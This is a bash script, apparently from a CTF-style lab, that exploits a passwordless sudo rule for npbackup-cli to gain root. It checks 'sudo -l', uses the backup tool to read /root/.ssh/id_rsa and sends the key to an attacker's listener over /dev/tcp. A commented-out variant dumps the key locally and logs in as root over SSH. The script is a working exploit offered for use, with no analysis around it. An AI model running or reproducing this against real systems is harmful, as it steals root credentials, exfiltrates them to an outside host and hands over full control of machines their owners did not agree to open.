#!/usr/bin/env bash

banner() {
    echo "╔══════════════════════════════╗"
    echo "║    NpBackup-Cli PRIV ESCer   ║"
    echo "╚══════════════════════════════╝"
    echo -e "\t\tby @Deemon"; echo ""
}

initSudo() {
    local init=$(sudo -l)
    if echo "$init" | grep '(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli' >/dev/null; then
        echo "[+] Target may be vulnerable!"
    else
        echo "[-] Target may not be vulnerable..."
    fi
}

set_vars() {
    echo -n "[?] Enter listening IPv4 address: "; read ip
    echo -n "[?] Enter listening port: "; read port
    if [[ ! "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "[-] Invalid IPv4 address. Exiting..."
        exit 1
    elif [[ ! "$port" =~ ^[0-9]+$ ]]; then
        echo "[-] Invalid port number. Exiting..."
        exit 1
    fi
}

ssh_func() {
    local key="/root/.ssh/id_rsa"
    local fn="id_rsa"
    
    echo "[+] Backing up $key ..."
    sudo $(which npbackup-cli) -c "$(pwd)/npbackup.conf" --raw "backup $key" >/dev/null
    
    echo "[+] Dumping $key to $fn"
    sudo $(which npbackup-cli) -c "$(pwd)/npbackup.conf" --dump "$key" > "$fn"
    
    chmod 600 "$fn"
    
    echo "[+] Logging in as root@$(cat /etc/hostname) ..."
    ssh -i "$fn" root@127.0.0.1
}

main() {
    local file="/root/.ssh/id_rsa"

    echo "[+] Backing up $file ..."
    sudo npbackup-cli -c npbackup.conf --raw "backup $file" >/dev/null

    echo "[+] Sending output to $ip:$port"
    sudo npbackup-cli -c npbackup.conf --dump "$file" > /dev/tcp/"$ip"/"$port"

    echo "[+] Check your listener. ($ip:$port)"
}

banner
initSudo
set_vars
main

#banner
#initSudo
#ssh_func